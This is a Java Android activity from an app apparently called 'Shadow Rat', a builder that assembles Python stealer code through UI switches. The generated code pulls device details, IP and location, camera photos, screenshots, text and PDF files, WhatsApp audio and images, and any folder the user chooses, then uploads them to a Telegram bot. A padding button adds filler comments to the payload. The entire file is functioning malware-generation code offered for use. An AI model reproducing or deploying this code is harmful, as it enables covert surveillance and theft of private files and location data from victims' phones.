package shadow.rat.premium;

import android.animation.*;
import android.app.*;
import android.content.*;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.os.Bundle;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.materialswitch.MaterialSwitch;
import com.google.android.material.textfield.*;
import com.google.firebase.FirebaseApp;
import java.io.*;
import java.io.InputStream;
import java.text.*;
import java.util.*;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;

public class ConfigActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	
	private FloatingActionButton _fab;
	private String main = "";
	private String marka = "";
	private String output = "";
	private String model = "";
	private HashMap<String, Object> map = new HashMap<>();
	private String isim = "";
	private String sablon = "";
	private boolean ozelrat = false;
	private boolean ozelvirus = false;
	private String kabartma = "";
	private double a = 0;
	private double b = 0;
	
	private LinearLayout linear1;
	private TimePicker timepicker1;
	private LinearLayout linear2;
	private ScrollView vscroll1;
	private TextView textview1;
	private LinearLayout linear12;
	private LinearLayout linear13;
	private TextView textview6;
	private ImageView imageview1;
	private LinearLayout linear3;
	private LinearLayout linear6;
	private LinearLayout linear23;
	private LinearLayout linear24;
	private LinearLayout linear28;
	private LinearLayout linear33;
	private LinearLayout linear39;
	private LinearLayout linear80;
	private LinearLayout linearcihazbilg;
	private TextView textview2;
	private LinearLayout linear5;
	private LinearLayout linear7;
	private LinearLayout linear8;
	private LinearLayout linear9;
	private LinearLayout linear38;
	private MaterialSwitch switch1;
	private MaterialSwitch switch6;
	private MaterialSwitch switch5;
	private MaterialSwitch switch7;
	private MaterialSwitch switch21;
	private LinearLayout lineardep;
	private LinearLayout linear75;
	private LinearLayout linear19;
	private LinearLayout linear20;
	private TextView textview8;
	private MaterialSwitch switch8;
	private MaterialSwitch switch9;
	private LinearLayout lineardosya;
	private TextView textview9;
	private LinearLayout linear73;
	private LinearLayout linear26;
	private LinearLayout linear27;
	private LinearLayout linear48;
	private LinearLayout linear50;
	private LinearLayout linear72;
	private MaterialSwitch switch36;
	private MaterialSwitch switch12;
	private MaterialSwitch switch13;
	private MaterialSwitch switch29;
	private MaterialSwitch switch30;
	private MaterialSwitch switch35;
	private LinearLayout linearagveip;
	private TextView textview10;
	private LinearLayout linear29;
	private LinearLayout linear31;
	private LinearLayout linear32;
	private MaterialSwitch switch14;
	private MaterialSwitch switch16;
	private MaterialSwitch switch17;
	private LinearLayout linearkonum;
	private TextView textview11;
	private LinearLayout linear35;
	private LinearLayout linear36;
	private LinearLayout linear37;
	private MaterialSwitch switch18;
	private MaterialSwitch switch19;
	private MaterialSwitch switch20;
	private LinearLayout linear51;
	private LinearLayout linearvirus;
	private LinearLayout linear74;
	private LinearLayout linear70;
	private LinearLayout linear4;
	private LinearLayout linear77;
	private LinearLayout linear71;
	private LinearLayout linear84;
	private TextView textview16;
	private TextView textview17;
	private TextInputLayout textinputlayout1;
	private Button button1;
	private EditText edittext2;
	private TextView textview18;
	private TextInputLayout textinputlayout2;
	private Button button2;
	private EditText edittext4;
	private LinearLayout linear83;
	
	private Intent intent = new Intent();
	private TimerTask timer;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.config);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		_fab = findViewById(R.id._fab);
		linear1 = findViewById(R.id.linear1);
		timepicker1 = findViewById(R.id.timepicker1);
		linear2 = findViewById(R.id.linear2);
		vscroll1 = findViewById(R.id.vscroll1);
		textview1 = findViewById(R.id.textview1);
		linear12 = findViewById(R.id.linear12);
		linear13 = findViewById(R.id.linear13);
		textview6 = findViewById(R.id.textview6);
		imageview1 = findViewById(R.id.imageview1);
		linear3 = findViewById(R.id.linear3);
		linear6 = findViewById(R.id.linear6);
		linear23 = findViewById(R.id.linear23);
		linear24 = findViewById(R.id.linear24);
		linear28 = findViewById(R.id.linear28);
		linear33 = findViewById(R.id.linear33);
		linear39 = findViewById(R.id.linear39);
		linear80 = findViewById(R.id.linear80);
		linearcihazbilg = findViewById(R.id.linearcihazbilg);
		textview2 = findViewById(R.id.textview2);
		linear5 = findViewById(R.id.linear5);
		linear7 = findViewById(R.id.linear7);
		linear8 = findViewById(R.id.linear8);
		linear9 = findViewById(R.id.linear9);
		linear38 = findViewById(R.id.linear38);
		switch1 = findViewById(R.id.switch1);
		switch6 = findViewById(R.id.switch6);
		switch5 = findViewById(R.id.switch5);
		switch7 = findViewById(R.id.switch7);
		switch21 = findViewById(R.id.switch21);
		lineardep = findViewById(R.id.lineardep);
		linear75 = findViewById(R.id.linear75);
		linear19 = findViewById(R.id.linear19);
		linear20 = findViewById(R.id.linear20);
		textview8 = findViewById(R.id.textview8);
		switch8 = findViewById(R.id.switch8);
		switch9 = findViewById(R.id.switch9);
		lineardosya = findViewById(R.id.lineardosya);
		textview9 = findViewById(R.id.textview9);
		linear73 = findViewById(R.id.linear73);
		linear26 = findViewById(R.id.linear26);
		linear27 = findViewById(R.id.linear27);
		linear48 = findViewById(R.id.linear48);
		linear50 = findViewById(R.id.linear50);
		linear72 = findViewById(R.id.linear72);
		switch36 = findViewById(R.id.switch36);
		switch12 = findViewById(R.id.switch12);
		switch13 = findViewById(R.id.switch13);
		switch29 = findViewById(R.id.switch29);
		switch30 = findViewById(R.id.switch30);
		switch35 = findViewById(R.id.switch35);
		linearagveip = findViewById(R.id.linearagveip);
		textview10 = findViewById(R.id.textview10);
		linear29 = findViewById(R.id.linear29);
		linear31 = findViewById(R.id.linear31);
		linear32 = findViewById(R.id.linear32);
		switch14 = findViewById(R.id.switch14);
		switch16 = findViewById(R.id.switch16);
		switch17 = findViewById(R.id.switch17);
		linearkonum = findViewById(R.id.linearkonum);
		textview11 = findViewById(R.id.textview11);
		linear35 = findViewById(R.id.linear35);
		linear36 = findViewById(R.id.linear36);
		linear37 = findViewById(R.id.linear37);
		switch18 = findViewById(R.id.switch18);
		switch19 = findViewById(R.id.switch19);
		switch20 = findViewById(R.id.switch20);
		linear51 = findViewById(R.id.linear51);
		linearvirus = findViewById(R.id.linearvirus);
		linear74 = findViewById(R.id.linear74);
		linear70 = findViewById(R.id.linear70);
		linear4 = findViewById(R.id.linear4);
		linear77 = findViewById(R.id.linear77);
		linear71 = findViewById(R.id.linear71);
		linear84 = findViewById(R.id.linear84);
		textview16 = findViewById(R.id.textview16);
		textview17 = findViewById(R.id.textview17);
		textinputlayout1 = findViewById(R.id.textinputlayout1);
		button1 = findViewById(R.id.button1);
		edittext2 = findViewById(R.id.edittext2);
		textview18 = findViewById(R.id.textview18);
		textinputlayout2 = findViewById(R.id.textinputlayout2);
		button2 = findViewById(R.id.button2);
		edittext4 = findViewById(R.id.edittext4);
		linear83 = findViewById(R.id.linear83);
		
		switch1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = main.concat("\n".concat("marka = subprocess.check_output([\"getprop\",\"ro.product.brand\"]).decode().strip()\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Cihaz Markası: {marka}\"})\n"))));
				} else {
					output = main.concat("\n");
				}
			}
		});
		
		switch6.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("model = subprocess.check_output([\"getprop\",\"ro.product.model\"]).decode().strip()\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Cihaz Modeli: {model}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch5.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("uretici = subprocess.check_output([\"getprop\",\"ro.product.manufacturer\"]).decode().strip()\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Cihaz Üreticisi: {uretici}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch7.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("android_version = subprocess.check_output([\"getprop\",\"ro.build.version.release\"]).decode().strip()\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Android Versiyon: {android_version}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch21.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("sdk_version = subprocess.check_output([\"getprop\",\"ro.build.version.sdk\"]).decode().strip()\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"SDK Versiyon: {sdk_version}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch8.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("d = subprocess.check_output([\"df\",\"/data\"]).decode().splitlines()[1].split()\ndep_toplam = round(int(d[1])/1024/1024, 2)\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Toplam Depolama Alanı: {dep_toplam}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch9.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("r = subprocess.check_output([\"cat\", \"/proc/meminfo\"]).decode().splitlines()\nram_toplam = round(int(r[0].split()[1])/1024/1024, 2)\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Cihazın Ramı: {ram_toplam}\"})\n\n"))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch36.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("galeri_yolu = \"/storage/emulated/0/DCIM/Camera/\"\n".concat("resimler = [os.path.join(galeri_yolu,f) for f in os.listdir(galeri_yolu)\n".concat("            if f.lower().endswith((\".jpg\",\".png\"))]\n\n".concat("for resim in resimler:\n".concat("    with open(resim, \"rb\") as file:\n".concat("        url = f\"https://api.telegram.org/bot{TOKEN}/sendPhoto\"\n".concat("        requests.post(url, data={\"chat_id\": İD}, files={\"photo\": file})\n\n"))))))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch12.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("galeri_yolu = \"/storage/emulated/0/DCIM/Screenshots/\"\n".concat("resimler = [os.path.join(galeri_yolu,f) for f in os.listdir(galeri_yolu)\n".concat("            if f.lower().endswith((\".jpg\",\".png\"))]\n\n".concat("for resim in resimler:\n".concat("    with open(resim, \"rb\") as file:\n".concat("        url = f\"https://api.telegram.org/bot{TOKEN}/sendPhoto\"\n".concat("        requests.post(url, data={\"chat_id\": İD}, files={\"photo\": file})\n\n"))))))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch13.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("klasorler = [\"/storage/emulated/0/\", \"/storage/emulated/0/Download/\"]\n".concat("for klasor in klasorler:\n".concat("    if os.path.exists(klasor):\n".concat("        for dosya in os.listdir(klasor):\n".concat("            if dosya.lower().endswith(\".txt\"):\n".concat("                dosya_yolu = os.path.join(klasor, dosya)\n".concat("                if os.path.getsize(dosya_yolu) <= 1024*1024:\n".concat("                    with open(dosya_yolu, \"rb\") as f:\n".concat("                        url = f\"https://api.telegram.org/bot{TOKEN}/sendDocument\"\n".concat("                        requests.post(url, data={\"chat_id\": İD}, files={\"document\": f})\n\n")))))))))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch29.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("for root, _, files in os.walk(\"/storage/emulated/0/Download\"):\n".concat("    for f in files:\n".concat("        if f.lower().endswith(\".pdf\"):\n".concat("            path = os.path.join(root, f)\n".concat("            requests.post(\n                f\"https://api.telegram.org/bot{TOKEN}/sendDocument\",\n".concat("data={\"chat_id\": İD},\n                files={\"document\": open(path, \"rb\")}\n            )")))))));
					((ClipboardManager) getSystemService(getApplicationContext().CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText("clipboard", output));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch30.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("P = \"/sdcard/Android/media/com.whatsapp/WhatsApp/Media\"\n".concat("for r, _, fs in os.walk(P):\n".concat("    for f in fs:\n".concat("        if f.lower().endswith(('.opus', '.mp3', '.m4a')):\n".concat("            with open(os.path.join(r, f), 'rb') as a:\n".concat("                requests.post(\n                    f\"https://api.telegram.org/bot{TOKEN}/sendAudio\",\n                    data={'chat_id': ID},\n                    files={'audio': a}\n                )\n")))))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch35.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("P = \"/sdcard/Android/media/com.whatsapp/WhatsApp/Media\"\n".concat("for r, _, fs in os.walk(P):\n".concat("    for f in fs:\n".concat("        if f.lower().endswith(('.jpg', '.jpeg', '.png')):\n".concat("            with open(os.path.join(r, f), 'rb') as img:\n".concat("                requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendPhoto\", data={'chat_id': İD}, files={'photo': img})")))))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch14.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n\n".concat("ip = response.get(\"ip\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"İP Adresi: {ip}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch16.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n\n".concat("asn = response.get(\"asn\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"ASN Ağı: {asn}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch17.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n".concat("org = response.get(\"org\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"İnternet Sağlayıcısı: {org}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch18.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n".concat("city = response.get(\"city\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Şehir: {city}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch19.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n".concat("continent = response.get(\"continent\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Bölge: {continent}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		switch20.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton _param1, boolean _param2) {
				final boolean _isChecked = _param2;
				if (_isChecked) {
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n".concat("latitude = response.get(\"latitude\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Enlem: {latitude}\"})\n\n")))));
					output = output.concat("\n".concat("response = requests.get(\"https://ipwhois.app/json/\").json()\n".concat("longitude = response.get(\"longitude\")\n".concat("requests.post(f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\"chat_id\": İD, \"text\": f\"Boylam: {longitude}\"})\n\n")))));
				} else {
					output = output.concat("\n");
				}
			}
		});
		
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (ozelrat) {
					output = output.concat("\n".concat("for r,_,f in os.walk(\"".concat(edittext2.getText().toString().concat("\"):\n".concat("    for i in f:\n".concat("        try:\n".concat("            requests.post(\n".concat("                f\"https://api.telegram.org/bot{TOKEN}/sendDocument\",\n".concat("                data={\"chat_id\": CHAT},\n".concat("                files={\"document\": open(os.path.join(r,i),\"rb\")}\n".concat("            )\n".concat("        except: pass\n\n"))))))))))));
					ozelrat = false;
				} else {
					output = output;
					ozelrat = true;
				}
			}
		});
		
		button2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				a = Double.parseDouble(edittext4.getText().toString());
				b = 0;
				if (!edittext4.getText().toString().equals("")) {
					for(int _repeat52 = 0; _repeat52 < (int)(a); _repeat52++) {
						if (!(b == a)) {
							kabartma = kabartma.concat("\n".concat("# Bu bir yorum satırıdır"));
							b++;
						} else {
							break;
						}
					}
				} else {
					SketchwareUtil.showMessage(getApplicationContext(), "Add Text");
				}
			}
		});
		
		_fab.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				output = kabartma.concat(output.concat("\n\n".concat("mesaj = \"Shadow Rat • Channel: t.me/shadxwrat\"\n\n".concat("requests.post(\n    f\"https://api.telegram.org/bot{TOKEN}/sendMessage\",\n".concat("data={\n        \"chat_id\": İD,\n        \"text\": mesaj\n    }\n)\n")))));
				timer = new TimerTask() {
					@Override
					public void run() {
						runOnUiThread(new Runnable() {
							@Override
							public void run() {
								intent.setClass(getApplicationContext(), KurulumActivity.class);
								intent.putExtra("kod", output);
								intent.putExtra("isim", isim);
								startActivity(intent);
								finish();
							}
						});
					}
				};
				_timer.schedule(timer, (int)(1000));
			}
		});
	}
	
	private void initializeLogic() {
		sablon = getIntent().getStringExtra("sablon");
		ozelrat = true;
		ozelvirus = true;
		main = "import requests\n".concat("import subprocess\n".concat("import os\n".concat("from colorama import Fore, Style, init\n".concat("from pyfiglet import Figlet\n\n".concat("TOKEN = ".concat("\"".concat(getIntent().getStringExtra("token").concat("\"\n".concat("İD = ".concat("\"".concat(getIntent().getStringExtra("id").concat("\"\n\n".concat(sablon)))))))))))));
		output = main;
		isim = getIntent().getStringExtra("isim");
		linear12.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)45, 0xFF212121));
		linearcihazbilg.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		lineardosya.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		lineardep.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		linearagveip.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		linearkonum.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		linearvirus.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFF212121));
		linear13.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)45, 0xFF212121));
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}